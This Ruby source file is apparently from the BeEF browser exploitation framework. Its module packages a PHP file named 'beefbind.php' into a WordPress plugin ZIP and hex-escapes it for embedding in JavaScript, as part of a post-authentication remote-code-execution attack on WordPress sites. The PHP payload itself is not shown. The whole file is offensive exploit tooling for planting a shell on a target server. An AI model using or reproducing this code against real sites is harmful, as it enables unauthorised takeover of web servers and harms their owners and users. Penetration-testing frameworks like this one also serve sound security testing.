#
# Copyright (c) Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
# This is a rewrite of the original module misc/wordpress_post_auth_rce.
#
# Original Author: Bart Leppens
# Rewritten by Erwan LR (@erwan_lr | WPScanTeam)
#

require_relative '../wordpress_command'

class Wordpress_upload_rce_plugin < WordPressCommand
  # Generate the plugin ZIP file as string. The method is called in the command.js.
  # This allows easy modification of the beefbind.php to suit the needs, as well as being automatically generated
  # even when the module is used with automated rules
  def self.generate_zip_payload
    stringio = Zip::OutputStream::write_buffer do |zio|
      zio.put_next_entry("beefbind.php")
      zio.write(File.read(File.join(File.dirname(__FILE__), 'beefbind.php')))
    end

    stringio.rewind
    
    payload         = stringio.sysread
    escaped_payload = ''

    # Escape payload to be able to put it in the JS
    payload.each_byte do |byte|
      escaped_payload << "\\" + ("x%02X" % byte)
    end

    escaped_payload
  end
end
